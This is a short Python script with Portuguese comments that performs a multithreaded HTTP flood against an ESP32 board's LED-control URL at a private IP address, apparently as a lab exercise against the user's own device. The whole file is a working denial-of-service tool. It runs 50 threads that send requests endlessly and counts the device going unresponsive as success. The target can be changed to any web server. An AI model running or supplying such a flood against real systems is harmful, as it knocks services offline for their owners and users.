import threading
import requests
import time
# --- CONFIGURAÇÃO ---
IP = "10.128.0.47"  # <--- COLOQUE O IP DO SEU ESP32
URL_ALVO = f"http://{IP}/26/on" # Vamos atacar o comando de ligar o LED
NUM_THREADS = 50  # Vamos simular 50 conexões simultâneas
# --------------------
print(f"Iniciando HTTP FLOOD em: {URL_ALVO}")
print("Pressione Ctrl+C para parar (ou feche a janela).")
def atacar():
    while True:
        try:
            # Envia a requisição tentando ser o mais rápido possível
            # timeout curto para não ficar esperando o ESP32 responder
            r = requests.get(URL_ALVO, timeout=0.5)
            # Se respondeu 200 (OK), o ataque foi processado
            print(f"Ataque enviado! Status: {r.status_code}", end='\r')
        except requests.exceptions.RequestException:
            # Se der erro, é SINAL DE SUCESSO (o ESP32 parou de responder)
            print("\n[!] O servidor parou de responder ou recusou conexão!", end='')
            pass
# Criar e iniciar várias threads (processos paralelos)
threads = []
for i in range(NUM_THREADS):
    t = threading.Thread(target=atacar)
    t.daemon = True # Mata as threads quando o programa principal fechar
    t.start()
    threads.append(t)
# Mantém o script rodando
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\nParando ataque...")